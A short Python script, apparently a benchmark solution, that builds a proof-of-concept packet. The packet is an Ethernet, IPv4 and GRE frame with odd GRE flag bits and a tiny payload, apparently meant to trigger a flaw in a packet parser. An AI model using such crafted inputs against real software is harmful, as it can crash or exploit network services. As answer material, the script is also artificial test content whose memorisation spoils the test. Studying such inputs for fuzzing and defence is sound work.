import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        
        def calculate_ipv4_checksum(header: bytes) -> bytes:
            s = 0
            if len(header) % 2 != 0:
                header += b'\x00'
            
            for i in range(0, len(header), 2):
                w = (header[i] << 8) + header[i+1]
                s += w
            
            s = (s >> 16) + (s & 0xffff)
            s += (s >> 16)
            
            s = ~s & 0xffff
            
            return struct.pack('>H', s)

        eth_header = b'\x00' * 12 + b'\x08\x00'

        ip_total_length = 20 + 4 + 7
        ip_header_no_checksum = (
            b'\x45\x00' +
            struct.pack('>H', ip_total_length) +
            b'\x00\x00' +
            b'\x00\x00' +
            b'\x40' +
            b'\x2f' +
            b'\x00\x00' +
            b'\x00\x00\x00\x00' +
            b'\x00\x00\x00\x00'
        )
        
        ip_checksum = calculate_ipv4_checksum(ip_header_no_checksum)
        ip_header = ip_header_no_checksum[:10] + ip_checksum + ip_header_no_checksum[12:]

        gre_header = b'\x88\xb7\x65\x58'

        payload = b'\x00\x00\x07\x00\x00\x00\x00'

        poc = eth_header + ip_header + gre_header + payload
        
        return poc
